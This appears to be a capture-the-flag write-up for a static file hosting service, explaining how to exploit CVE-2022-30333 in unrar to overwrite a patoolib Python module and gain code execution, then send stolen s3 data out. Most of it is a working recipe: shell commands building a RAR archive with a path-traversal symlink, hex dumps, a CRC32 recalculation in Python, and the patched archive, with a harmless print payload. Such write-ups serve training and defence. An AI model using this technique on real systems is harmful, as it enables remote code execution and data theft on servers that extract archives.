# SH

## Description

SH is a service for hosting static files. There are two routes in application:

1. `@app.post("/bucket/~{bucket}")` for create an s3 bucket with a given name and files from archive;
2. `@app.get("/~{bucket}/{file}")` for get a file from bucket.

## Steps to exploit

- To hack this service you can exploit [CVE-2022-30333](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-30333) bug and upload a malicious `rar` archive.
- Service will extract files from the archive and can rewrite any python module at this time (i.e. module for some archive type in patoolib).
- Next, the service will extract other embedded archives and import malicious module for this type of arсhive and execute arbitrary code.
- In this code you can get needed data from s3 and send it to own service over network.

## Howto create a vuln archive

To create an archive on Windows you can follow [this instruction](https://attackerkb.com/topics/RCa4EIZdbZ/cve-2022-30333/rapid7-analysis). But you can create such archive in GNU/Linux:

1. Create files and archive

```
$ ln -s "..\..\..\..\..\..\..\..\..\..\..\..\..\..\home/sh/.local/lib/python3.10/site-packages/patoolib/programs/dpkg.py" prog
$ echo 'print("Hack!\n")' > Prog
$ echo 'nothing' > p.deb
$ rar a -ol -ai -cl h.rar prog Prog p.deb
```

2. Review archive

```
$ unrar lt h.rar prog

UNRAR 5.61 beta 1 freeware      Copyright (c) 1993-2018 Alexander Roshal

Archive: h.rar
Details: RAR 5

        Name: prog
        Type: Unix symbolic link
      Target: ..\..\..\..\..\..\..\..\..\..\..\..\..\..\home/sh/.local/lib/python3.10/site-packages/patoolib/programs/dpkg.py
        Size: 111
 Packed size: 0
       Ratio: 0%
       mtime: 2022-08-07 17:26:16,130836090
  Attributes: -rw-rw-rw-
       CRC32: 00000000
     Host OS: Unix
 Compression: RAR 5.0(v50) -m0 -md=32M

        Name: prog
        Type: File
        Size: 17
 Packed size: 17
       Ratio: 100%
       mtime: 2022-08-07 17:26:19,450867319
  Attributes: -rw-rw-rw-
       CRC32: 58075175
     Host OS: Unix
 Compression: RAR 5.0(v50) -m0 -md=32M
```

3. We need fix first `prog` file: change `Unix symbolic link` to `Windows symbol link`, Host OS from `Unix` to `Windows` and then recalc CRC32 of header. You can found details about `RAR` format in [official docs](https://www.rarlab.com/technote.htm). Original arhive:

```
$ xxd h.rar
00000000: 5261 7221 1a07 0100 3392 b5e5 0a01 0506  Rar!....3.......
00000010: 0005 0101 8080 0075 be0e 9894 0102 037f  .......u........
00000020: 0004 6fb6 8302 0000 0000 8040 0104 7072  ..o........@..pr
00000030: 6f67 0a03 1368 afef 627a 66cc 0773 0501  og...h..bzf..s..
00000040: 006f 2e2e 5c2e 2e5c 2e2e 5c2e 2e5c 2e2e  .o..\..\..\..\..
00000050: 5c2e 2e5c 2e2e 5c2e 2e5c 2e2e 5c2e 2e5c  \..\..\..\..\..\
00000060: 2e2e 5c2e 2e5c 2e2e 5c2e 2e5c 686f 6d65  ..\..\..\..\home
00000070: 2f73 682f 2e6c 6f63 616c 2f6c 6962 2f70  /sh/.local/lib/p
00000080: 7974 686f 6e33 2e31 302f 7369 7465 2d70  ython3.10/site-p
00000090: 6163 6b61 6765 732f 7061 746f 6f6c 6962  ackages/patoolib
000000a0: 2f70 726f 6772 616d 732f 6470 6b67 2e70  /programs/dpkg.p
000000b0: 7977 7737 2522 0203 0b91 0004 9100 b683  yww7%"..........
000000c0: 0275 5107 5880 4001 0470 726f 670a 0313  .uQ.X.@..prog...
000000d0: 6baf ef62 77b0 df1a 7072 696e 7428 2248  k..bw...print("H
000000e0: 6163 6b21 5c6e 2229 0a4b 2815 ce23 0203  ack!\n").K(..#..
000000f0: 0b88 0004 8800 b683 026a 6842 2a80 4001  .........jhB*.@.
00000100: 0570 2e64 6562 0a03 136e afef 625a 9e82  .p.deb...n..bZ..
00000110: 036e 6f74 6869 6e67 0a1d 7756 5103 0504  .nothing..wVQ...
00000120: 00                                       .
$
```

4. Recalc CRC32

```
$ python3
>>> import zlib
>>> data = "940102037f00046fb68302000000008040000470726f670a031368afef627a66cc07730502006f2e2e5c2e2e5c2e2e5c2e2e5c2e2e5c2e2e5c2e2e5c2e2e5c2e2e5c2e2e5c2e2e5c2e2e5c2e2e5c2e2e5c686f6d652f73682f2e6c6f63616c2f6c69622f707974686f6e332e31302f736974652d7061636b616765732f7061746f6f6c69622f70726f6772616d732f64706b672e7079"
>>> hex(zlib.crc32(bytes.fromhex(data)))
'0x7cdb6d3'
```

5. And then change checksum in file. Final archive:

```
$ xxd hh.rar
00000000: 5261 7221 1a07 0100 3392 b5e5 0a01 0506  Rar!....3.......
00000010: 0005 0101 8080 00d3 b6cd 0794 0102 037f  ................
00000020: 0004 6fb6 8302 0000 0000 8040 0004 7072  ..o........@..pr
00000030: 6f67 0a03 1368 afef 627a 66cc 0773 0502  og...h..bzf..s..
00000040: 006f 2e2e 5c2e 2e5c 2e2e 5c2e 2e5c 2e2e  .o..\..\..\..\..
00000050: 5c2e 2e5c 2e2e 5c2e 2e5c 2e2e 5c2e 2e5c  \..\..\..\..\..\
00000060: 2e2e 5c2e 2e5c 2e2e 5c2e 2e5c 686f 6d65  ..\..\..\..\home
00000070: 2f73 682f 2e6c 6f63 616c 2f6c 6962 2f70  /sh/.local/lib/p
00000080: 7974 686f 6e33 2e31 302f 7369 7465 2d70  ython3.10/site-p
00000090: 6163 6b61 6765 732f 7061 746f 6f6c 6962  ackages/patoolib
000000a0: 2f70 726f 6772 616d 732f 6470 6b67 2e70  /programs/dpkg.p
000000b0: 7977 7737 2522 0203 0b91 0004 9100 b683  yww7%"..........
000000c0: 0275 5107 5880 4001 0470 726f 670a 0313  .uQ.X.@..prog...
000000d0: 6baf ef62 77b0 df1a 7072 696e 7428 2248  k..bw...print("H
000000e0: 6163 6b21 5c6e 2229 0a4b 2815 ce23 0203  ack!\n").K(..#..
000000f0: 0b88 0004 8800 b683 026a 6842 2a80 4001  .........jhB*.@.
00000100: 0570 2e64 6562 0a03 136e afef 625a 9e82  .p.deb...n..bZ..
00000110: 036e 6f74 6869 6e67 0a1d 7756 5103 0504  .nothing..wVQ...
00000120: 00                                       .
$
```

6. Review archive

```
$ unrar lt hh.rar prog

UNRAR 5.61 beta 1 freeware      Copyright (c) 1993-2018 Alexander Roshal

Archive: hh.rar
Details: RAR 5

        Name: prog
        Type: Windows symbolic link
      Target: ..\..\..\..\..\..\..\..\..\..\..\..\..\..\home/sh/.local/lib/python3.10/site-packages/patoolib/programs/dpkg.py
        Size: 111
 Packed size: 0
       Ratio: 0%
       mtime: 2022-08-07 17:26:16,130836090
  Attributes: ..ADSH.
       CRC32: 00000000
     Host OS: Windows
 Compression: RAR 5.0(v50) -m0 -md=32M

        Name: prog
        Type: File
        Size: 17
 Packed size: 17
       Ratio: 100%
       mtime: 2022-08-07 17:26:19,450867319
  Attributes: -rw-rw-rw-
       CRC32: 58075175
     Host OS: Unix
 Compression: RAR 5.0(v50) -m0 -md=32M

$
```
